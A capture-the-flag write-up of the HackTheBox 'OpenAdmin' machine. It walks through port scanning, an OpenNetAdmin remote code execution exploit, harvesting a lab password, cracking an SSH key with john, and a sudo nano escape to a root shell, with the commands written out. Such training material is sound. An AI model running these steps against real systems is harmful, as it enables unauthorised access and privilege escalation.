---
date: 2020-05-17 06:52:37
layout: post
title: "Openadmin"
subtitle: Hackthebox
description:
image: /writeup/assets/img/openadmin/openadmin.png
optimized_image:
category: Hackthebox
tags: OpenNetadmin
author:
paginate: false
---

Starting with the nmap scan,
```bash
nmap -T4 -p- -A 10.10.10.171
```
Found 2 open ports.
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   470.80 ms 10.10.14.1
2   455.86 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.60 seconds
```
Opening the website hosted at port 80.We get a default apache2 page.
Fuzzing for directories and pages 
```bash
ffuf -w wordlist -u http://10.10.10.171/FUZZ -e .php,.html
```
We get directories **/music** and **/ona**.
![placeholder](/writeup/assets/img/openadmin/music.png "website")
Music directory contains a fine website and ona directory contains the OpenNetAdmin panel.
![placeholder](/writeup/assets/img/openadmin/panel.png "ona")

The version of opennetadmin is 18.1.1 which is vulnerable to a remote code execution exploit.
![placeholder](/writeup/assets/img/openadmin/ona.png "exploit")

Using the exploit we get a shell.
```bash
exp.sh http://10.10.10.171/ona/
```
![placeholder](/writeup/assets/img/openadmin/shell.png "shell")

Eumerating thorugh the machine we get a file */var/www/ona/local/config* which contains password for user jimmy.

**jimmy:n1nj4W4rri0R!**

Inside the /var/www directory, we get a direcctory named Internal . index.php isnide the internal directory contains a username jimmy and a hash which on reverse lookup comes to be **Revealed**.
Looking for open ports
```bash
netstat -tulpn
``` 
![placeholder](/writeup/assets/img/openadmin/ports.png "ports")
We found 1 unusual port 52846.
Maybe a site is hosted internally as it seems to be by the name of directory and the open port 52846.

Inside /etc/apache2/sites_enabled, we get three conf file, one among which states that a site is being operated internally.
```conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htbbloodninjas
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
Let's connect and see what can we get.
Since we know by looking in the files inside Internal directory tht index.php will be used to login and then main.php will show the ssh private key of user joanna.

```bash
curl -s http://127.0.0.1:52846/index.php -c cookie -d “username=jimmy&password=Revealed”
# -c is used to store session data in a cookie named cookie
# -d holds the data to provided in login form
```
and then
```bash
curl  -s http://127.0.0.1:52846/main.php -b cookie
#-b to fetch the cookie named cookie
```
We get the ssh private key for user joanna.
Cracking the key with john shows the passphrase **bloodninjas**

```bash
$ ssh2john.py priv_key > hash
$ john --wordlist=rockyou.txt hash
```
Logged in thorugh ssh.

```bash
ssh -i priv_key joanna@10.10.10.171
```
Got the joanna's shell as well as user.txt.

```bash
sudo -l
```
![placeholder](/writeup/assets/img/openadmin/sudo.png "sudo")
This shows that we can open /opt/priv by nano with root privileges.

Time for GTFObins.

Got the command needed to escalate our privileges
Open the file /opt/priv with root privileges as stated in sudoers file 
```bash
sudo /bin/nano /opt/priv 
```
Now ***Ctrl+R*** then ***Ctrl+X***

We will get tab at bottom to write command to execute.

Type 
***reset; sh 1>&0 2>&0*** 

Got the root shell and the root.txt.


